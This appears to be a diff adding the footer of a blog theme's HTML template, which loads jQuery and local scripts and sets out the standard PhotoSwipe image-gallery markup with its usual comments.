+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/typed.js"></script>
+<script src="/js/diaspora.js"></script>
+
+
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+
+
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+
+
+</html>
